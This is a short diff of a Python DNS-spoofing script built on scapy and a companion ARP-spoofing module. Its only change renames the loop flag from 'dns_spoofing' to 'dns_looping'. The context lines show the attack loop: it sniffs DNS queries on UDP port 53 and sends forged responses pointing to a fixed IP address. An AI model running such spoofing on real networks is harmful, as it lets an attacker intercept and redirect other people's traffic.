@@ -5,7 +5,7 @@ import arp_spoofing
 destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)
 
 
-dns_spoofing = True #set this to false to stop the thread
+dns_looping = True #set this to false to stop the thread
 
 #if packet is dns and has qr=0, it is a query
 def isDnsQuery(packet):
@@ -39,7 +39,7 @@ def dns_spoof(packet):
     scapy.send(spoofed_response)
 
 def dns_main_loop():
-    while dns_spoofing:
+    while dns_looping:
         #continuously sniff and respond to dns packets (udp port 53 is used for dns)
         arp_spoofing.arp_main_tick()
         scapy.sniff(filter="udp port 53", prn=dns_spoof, timeout = 5)
